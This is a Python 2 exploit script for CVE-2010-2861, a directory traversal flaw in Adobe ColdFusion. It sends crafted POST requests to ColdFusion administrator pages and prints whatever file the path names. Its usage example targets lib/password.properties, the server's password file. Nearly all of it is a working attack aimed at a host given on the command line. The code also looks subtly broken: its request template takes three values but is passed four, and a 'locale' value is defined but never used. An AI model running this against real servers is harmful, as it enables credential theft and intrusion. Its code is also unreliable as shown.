#!/usr/bin/python

# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
# detailed information about the exploitation of this vulnerability:
# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

import sys
import socket
import re

# in case some directories are blocked
filenames = ("/CFIDE/wizards/common/_logintowizard.cfm", "/CFIDE/administrator/archives/index.cfm", "/cfide/install.cfm", "/CFIDE/administrator/entman/index.cfm", "/CFIDE/administrator/enter.cfm")

post = """POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

"""

locale= "%%00en"  #%s%%00a

def main():
    if len(sys.argv) != 4:
        print "usage: %s <host> <port> <file_path>" % sys.argv[0]
        print "example: %s localhost 80 ../../../../../../../lib/password.properties" % sys.argv[0]
        print "if successful, the file will be printed"
        return
    
    host = sys.argv[1]
    port = sys.argv[2]
    path = sys.argv[3]

    for f in filenames:
        print "------------------------------"
        print "trying", f

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.send(post % (f, host, len(path) + 14, path))

        buf = ""
        while 1:
            buf_s = s.recv(1024)
            if len(buf_s) == 0:
                break
            buf += buf_s
       
        m = re.search('<title>(.*)</title>', buf, re.S)
        if m != None:
            title = m.groups(0)[0]
            print "title from server in %s:" % f
            print "------------------------------"
            print m.groups(0)[0]
            print "------------------------------"

if __name__ == '__main__':
    main()